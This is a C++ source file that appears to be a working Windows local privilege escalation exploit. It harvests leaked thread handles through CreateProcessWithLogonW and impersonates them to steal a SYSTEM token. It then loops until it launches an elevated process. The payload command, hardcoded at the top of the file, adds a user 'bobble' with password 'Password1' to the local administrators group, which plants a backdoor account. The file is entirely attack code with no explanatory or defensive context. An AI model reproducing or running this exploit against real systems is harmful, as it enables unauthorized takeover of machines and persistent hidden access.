#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <map>

#define MAX_PROCESSES 1000

#define COMMAND_LINE L"cmd.exe /c net user bobble Password1 /add && net localgroup administrators bobble /add"

HANDLE GetThreadHandle()
{
	PROCESS_INFORMATION procInfo = {};
	STARTUPINFOW startInfo = {};
	startInfo.cb = sizeof(startInfo);

	startInfo.hStdInput = GetCurrentThread();
	startInfo.hStdOutput = GetCurrentThread();
	startInfo.hStdError = GetCurrentThread();
	startInfo.dwFlags = STARTF_USESTDHANDLES;

	if (CreateProcessWithLogonW(L"test", L"test", L"test",
		LOGON_NETCREDENTIALS_ONLY,
		nullptr, L"cmd.exe", CREATE_SUSPENDED,
		nullptr, nullptr, &startInfo, &procInfo))
	{
		HANDLE hThread;
		BOOL res = DuplicateHandle(procInfo.hProcess, (HANDLE)0x4,
			GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
		DWORD dwLastError = GetLastError();
		TerminateProcess(procInfo.hProcess, 1);
		CloseHandle(procInfo.hProcess);
		CloseHandle(procInfo.hThread);
		if (!res)
		{
			printf("Error duplicating handle %d\n", dwLastError);
			exit(1);
		}

		return hThread;
	}
	else
	{
		printf("Error: %d\n", GetLastError());
		exit(1);
	}
}

typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle,
	HANDLE ThreadToImpersonate,
	PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

HANDLE GetSystemToken(HANDLE hThread)
{
	SuspendThread(hThread);

	NtImpersonateThread* fNtImpersonateThread =
		(NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"),
			"NtImpersonateThread");
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	SetThreadToken(&hThread, nullptr);
	NTSTATUS status = fNtImpersonateThread(hThread, hThread, &sqos);
	if (status != 0)
	{
		ResumeThread(hThread);
		printf("Error impersonating thread %08X\n", status);
		exit(1);
	}

	HANDLE hToken;
	if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
		FALSE, &hToken))
	{
		printf("Error opening thread token: %d\n", GetLastError());
		ResumeThread(hThread);
		exit(1);
	}

	ResumeThread(hThread);

	return hToken;
}

struct ThreadArg
{
	HANDLE hThread;
	HANDLE hToken;
};

DWORD CALLBACK SetTokenThread(LPVOID lpArg)
{
	ThreadArg* arg = (ThreadArg*)lpArg;
	while (true)
	{
		if (!SetThreadToken(&arg->hThread, arg->hToken))
		{
			printf("Error setting token: %d\n", GetLastError());
			break;
		}
	}
	return 0;
}

int main()
{
	std::map<DWORD, HANDLE> thread_handles;
	printf("Gathering thread handles\n");

	for (int i = 0; i < MAX_PROCESSES; ++i) {
		HANDLE hThread = GetThreadHandle();
		DWORD dwTid = GetThreadId(hThread);
		if (!dwTid)
		{
			printf("Handle not a thread: %d\n", GetLastError());
			exit(1);
		}

		if (thread_handles.find(dwTid) == thread_handles.end())
		{
			thread_handles[dwTid] = hThread;
		}
		else
		{
			CloseHandle(hThread);
		}
	}

	printf("Done, got %zd handles\n", thread_handles.size());

	if (thread_handles.size() > 0)
	{
		HANDLE hToken = GetSystemToken(thread_handles.begin()->second);
		printf("System Token: %p\n", hToken);

		for (const auto& pair : thread_handles)
		{
			ThreadArg* arg = new ThreadArg;

			arg->hThread = pair.second;
			DuplicateToken(hToken, SecurityImpersonation, &arg->hToken);

			CreateThread(nullptr, 0, SetTokenThread, arg, 0, nullptr);
		}

		while (true)
		{
			PROCESS_INFORMATION procInfo = {};
			STARTUPINFOW startInfo = {};
			startInfo.cb = sizeof(startInfo);

			if (CreateProcessWithLogonW(L"test", L"test", L"test",
				LOGON_NETCREDENTIALS_ONLY, nullptr,
				COMMAND_LINE, CREATE_SUSPENDED, nullptr, nullptr,
				&startInfo, &procInfo))
			{
				HANDLE hProcessToken;
				// If we can't get process token good chance it's a system process.
				if (!OpenProcessToken(procInfo.hProcess, MAXIMUM_ALLOWED,
					&hProcessToken))
				{
					printf("Couldn't open process token %d\n", GetLastError());
					ResumeThread(procInfo.hThread);
					break;
				}
				// Just to be sure let's check the process token isn't elevated.
				TOKEN_ELEVATION elevation;
				DWORD dwSize = 0;
				if (!GetTokenInformation(hProcessToken, TokenElevation,
					&elevation, sizeof(elevation), &dwSize))
				{
					printf("Couldn't get token elevation: %d\n", GetLastError());
					ResumeThread(procInfo.hThread);
					break;
				}

				if (elevation.TokenIsElevated)
				{
					printf("Created elevated process\n");
					ResumeThread(procInfo.hThread);
					break;
				}

				TerminateProcess(procInfo.hProcess, 1);
				CloseHandle(procInfo.hProcess);
				CloseHandle(procInfo.hThread);
			}
		}
	}

	return 0;
}
